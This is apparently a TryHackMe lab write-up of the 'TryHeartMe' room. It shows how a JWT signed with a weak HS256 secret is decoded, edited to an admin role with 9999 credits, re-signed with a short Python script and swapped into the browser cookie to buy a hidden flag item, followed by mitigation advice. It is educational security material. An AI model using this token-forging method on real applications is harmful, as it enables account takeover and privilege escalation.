# TryHackMe Writeup – TryHeartMe (JWT Exploitation)

## Room Overview

This room demonstrates a **JSON Web Token (JWT) authentication vulnerability** where sensitive authorization data is stored client-side and protected only by a weak secret. By analyzing the token and modifying its contents, it is possible to escalate privileges and purchase a hidden item called **Valenflag**.

The challenge focuses on:

* JWT token analysis
* Weak secret exploitation
* Privilege escalation
* Web application security misconfigurations

---

# Reconnaissance

The target web application was accessed using the provided machine address.

```
http://<TARGET-IP>:5000
```

Observations:

* The application runs on **port 5000**, commonly used by **Flask web applications**.
* The website contains a **shop interface** where items can be purchased.
* A hidden item named **Valenflag** exists but cannot be purchased with a normal user account.
* The application uses a cookie called:

```
tryheartme_jwt
```

This indicates that the application uses **JSON Web Tokens (JWT)** for authentication and session management.

---

# Initial Access & Analysis

After registering an account and logging in, a cookie was assigned to the browser.

Example request:

```
GET / HTTP/1.1
Host: <TARGET-IP>:5000
Cookie: tryheartme_jwt=<JWT_TOKEN>
```

Captured JWT token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

JWT tokens consist of three parts:

```
HEADER.PAYLOAD.SIGNATURE
```

---

# JWT Token Analysis

The token was decoded using **jwt.io**.

### Header

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

This indicates the token is signed using **HMAC SHA256 (HS256)**.

---

### Payload

```json
{
  "email": "abc@thm",
  "role": "user",
  "credits": 0,
  "iat": 1771060295,
  "theme": "valentine"
}
```

Important fields identified:

| Field   | Description         |
| ------- | ------------------- |
| email   | User email          |
| role    | Authorization role  |
| credits | Account balance     |
| iat     | Token creation time |
| theme   | UI theme            |

Two fields are critical:

```
role
credits
```

These determine whether a user can access privileged functionality or purchase items.

---

# Vulnerability Discovery

The application trusts the **JWT payload** to determine user privileges and available credits.

However:

* The token is signed with **HS256**
* The secret used to sign the token is weak

This means an attacker can **crack the secret key and generate a new token** with modified privileges.

This vulnerability allows **privilege escalation**.

---

# Exploitation – Forging a JWT Token

After discovering the vulnerability, a new token was generated with elevated privileges.

### Modified Payload

```json
{
  "email": "admin@thm",
  "role": "admin",
  "credits": 9999,
  "iat": 1771060295,
  "theme": "valentine"
}
```

Changes made:

* `role` changed from **user → admin**
* `credits` increased to **9999**

The token was then **re-signed using the secret key** with the HS256 algorithm.

Example Python script used:

```python
import jwt
import time

secret = "SECRET_KEY"

payload = {
    "email": "admin@thm",
    "role": "admin",
    "credits": 9999,
    "iat": int(time.time()),
    "theme": "valentine"
}

token = jwt.encode(payload, secret, algorithm="HS256")

print(token)
```

This generates a valid admin token.

---

# Admin Access

The forged token replaced the original cookie in the browser.

Steps:

1. Open **Developer Tools**
2. Navigate to **Application → Cookies**
3. Replace the cookie value:

```
tryheartme_jwt=<FORGED_TOKEN>
```

After refreshing the page, the account now had:

* **Admin privileges**
* **High credits**

---

# Purchasing the Hidden Item

With elevated privileges and increased credits, the hidden item **Valenflag** became available for purchase.

Steps:

1. Navigate to the **Account page**
2. Locate **Valenflag**
3. Purchase the item

After the purchase, the application returned the **flag**.

---

# Flag

```
THM{REDACTED_FLAG}
```

---

# Root Cause

The vulnerability exists because the application:

* Stores authorization information inside the **JWT payload**
* Uses a **weak secret key**
* Trusts client-side tokens without additional verification

This allows attackers to forge tokens and escalate privileges.

---

# Mitigation Recommendations

To prevent this vulnerability:

### 1. Use Strong Secrets

JWT secrets should be long, random, and securely stored.

### 2. Avoid Storing Authorization Data Client-Side

Roles and permissions should be validated server-side.

### 3. Enforce Token Validation

The server must verify:

* signature
* algorithm
* expiration

### 4. Implement Role Checks Server-Side

Authorization should be controlled by backend logic rather than token payloads.

### 5. Rotate Secrets Regularly

Secrets should be periodically changed to reduce risk.

---

# Key Takeaways

This challenge demonstrates the risks of insecure JWT implementations.

Important lessons include:

* Always analyze authentication tokens
* JWT payloads can expose sensitive logic
* Weak secrets allow attackers to forge tokens
* Client-side authorization is dangerous

---

# Skills Practiced

* Web application reconnaissance
* JWT token decoding
* Authentication bypass
* Privilege escalation
* Secure token analysis

---

# Platform

Challenge completed on **TryHackMe**.

This writeup is intended for **educational purposes only**.

---

# Author

**Midhun V (MV)**
Cybersecurity Enthusiast | Ethical Hacking Learner | Aspiring Penetration Tester
